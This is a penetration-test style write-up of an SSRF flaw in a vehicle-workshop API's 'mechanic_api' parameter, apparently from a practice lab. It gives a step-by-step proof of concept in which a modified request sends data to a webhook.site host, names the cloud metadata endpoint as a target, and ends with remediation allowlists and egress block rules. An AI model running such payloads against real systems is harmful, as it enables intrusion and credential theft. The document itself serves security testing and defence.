# Server-Side Request Forgery (SSRF)

## Vulnerability Metadata

| Field | Value |
|---------|---------|
| Vulnerability Type | Server-Side Request Forgery (SSRF) |
| CWE | CWE-918: Server-Side Request Forgery |
| CVSS v3.1 | 9.1 (Critical) |
| Vulnerable Endpoint | `/workshop/api/merchant/contact_mechanic` |
| HTTP Method | POST |

---
## Description

This finding covers the identification, exploitation, and mitigation of a **Server-Side Request Forgery (SSRF)** vulnerability within the vehicle workshop service functionality.

The application provides a **Contact Mechanic** feature that allows users to submit vehicle service requests. During testing, it was discovered that the backend accepts a user-controlled URL parameter named `mechanic_api`, which specifies the destination endpoint used by the server to forward vehicle diagnostic information.

Because the application does not properly validate or restrict outbound destinations, an attacker can modify this parameter and force the server to initiate arbitrary HTTP requests to external or internal systems. This behavior allows attackers to leverage the application server as a proxy to access resources that would otherwise be inaccessible.

The successful out-of-band interaction observed during testing confirms the presence of an exploitable SSRF vulnerability.

---
## Proof of Concept

### Step 1 – Access the Contact Mechanic Feature

Navigate to the **Contact Mechanic** functionality and submit a standard vehicle service request using a valid Vehicle Identification Number (VIN).

The application displays the service request form and allows users to select a mechanic and submit vehicle diagnostics.

![[Attachments/Pasted image 20260530165838.png|380]]

---
### Step 2 – Intercept the Request

Using Burp Suite, intercept the request generated when submitting the service request form.

The application sends the following JSON payload to the backend API:

![[Attachments/Pasted image 20260530170045.png]]

```http
POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Host: localhost:8888
Content-Type: application/json
Authorization: Bearer [JWT_TOKEN_REDACTED]

{
  "mechanic_code": "TRAC_JHN",
  "problem_details": "crash",
  "vin": "U70UHLS52U24H0R39",
  "mechanic_api": "http://localhost:8888/workshop/api/mechanic/receive_report",
  "repeat_request_if_failed": false,
  "number_of_repeats": 1
}
```

The presence of the `mechanic_api` parameter indicates that the backend dynamically determines the destination endpoint used to process the request.

---

### Step 3 – Modify the Destination URL

Using Burp Repeater or Intruder, replace the value of the `mechanic_api` parameter with an attacker-controlled endpoint.

```json
{
  "mechanic_code": "TRAC_JHN",
  "problem_details": "damage",
  "vin": "U70UHLS52U24H0R39",
  "mechanic_api": "https://webhook.site/5e170d61-d79d-4b2f-bb3e-8081a0239ba3",
  "repeat_request_if_failed": false,
  "number_of_repeats": 1
}
```

---
### Step 4 – Submit the Modified Request

Forward the modified request to the application.

The server responds successfully:

![[Attachments/Pasted image 20260530173522.png]]


```http
HTTP/1.1 200 OK

{
  "response_from_mechanic_api": {
      "id":277,
      "sent":true,
      "report_link":"http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=277"
  },
  "status":200
}
```

The successful response indicates that the backend processed the supplied URL and attempted communication with the specified endpoint.

---
### Step 5 – Verify Out-of-Band Interaction

Review the webhook.site dashboard and observe that the application server initiates a request to the attacker-controlled endpoint.


![[Attachments/Pasted image 20260530172943.png]]

Captured request:

```http
GET /5e170d61-d79d-4b2f-bb3e-8081a0239ba3?mechanic_code=TRAC_JHN&problem_details=damage&vin=U70UHLS52U24H0R39 HTTP/1.1
```

The request originates from the backend server rather than the client browser, confirming successful SSRF exploitation.

During testing, the callback request was received from the application server's public IP address, demonstrating that the backend performed the outbound connection on behalf of the attacker.

---
## Impact

### Internal Network Reconnaissance

Attackers can force the application to communicate with internal services that are not externally accessible, including:

```text
127.0.0.1
localhost
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

This may allow discovery of internal APIs, management interfaces, databases, and administrative services.

### Cloud Metadata Exposure

In cloud-hosted environments, attackers may access metadata services such as:

```text
http://169.254.169.254/
```

Potentially exposing:

- Cloud credentials
- Temporary access tokens
- IAM roles
- Runtime configuration secrets

### Data Exfiltration

Sensitive information may be transmitted to attacker-controlled servers through manipulated outbound requests.

### Security Control Bypass

SSRF can bypass:

- Network segmentation
- Firewalls
- Access control lists (ACLs)
- Internal-only service restrictions

### Denial of Service (DoS)

Attackers may abuse outbound connections to:

- Trigger excessive requests
- Exhaust application resources
- Create request loops
- Overload internal services

---
## Remediation

### Implement Destination Allowlisting

Restrict outbound requests to explicitly approved domains and internal services.

Example:

```text
Allowed:
https://mechanic.company.com

Blocked:
https://webhook.site
http://localhost
http://127.0.0.1
```

---
### Validate User-Supplied URLs

Reject requests containing:

- Loopback addresses
- Private IP ranges
- Link-local addresses
- Non-approved domains

---
### Disable Arbitrary URL Fetching

Do not allow clients to specify backend destinations directly.

Instead:

```text
mechanic_code → server-side mapping → approved endpoint
```

The client should never control the final destination URL.

---
### Implement Network-Level Restrictions

Configure firewalls and egress filtering to prevent connections to:

```text
127.0.0.1/8
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.169.254
```

---
### Monitor Outbound Traffic

Generate alerts when the application attempts to communicate with:

- Unknown hosts
- Internal IP ranges
- Suspicious external domains

---
## References

- OWASP Top 10 – Server-Side Request Forgery (SSRF)
- OWASP SSRF Prevention Cheat Sheet
- CWE-918: Server-Side Request Forgery
- NIST SP 800-53 Security Controls
- OWASP API Security Top 10